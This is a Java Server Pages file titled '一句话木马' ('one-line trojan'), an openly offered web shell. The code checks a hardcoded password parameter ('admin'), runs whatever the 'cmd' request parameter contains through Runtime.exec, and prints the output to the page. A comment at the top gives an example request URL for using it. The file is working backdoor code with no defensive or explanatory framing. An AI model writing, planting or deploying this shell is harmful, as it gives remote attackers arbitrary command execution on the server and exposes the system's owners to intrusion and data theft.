<%@ page language="java" contentType="text/html; charset=GBK"
    pageEncoding="UTF-8"%>
<!-- http://127.0.0.1/shell.jsp?pwd=admin&cmd=calc -->
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>一句话木马</title>
    </head>

    <body>
        <%
        if ("admin".equals(request.getParameter("pwd"))) {
            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            int len = -1;
            byte[] bytes = new byte[4092];
            out.print("<pre>");
            while ((len = input.read(bytes)) != -1) {
                out.println(new String(bytes, "UTF-8"));
            }
            out.print("</pre>");
        }
    %>
    </body>

</html>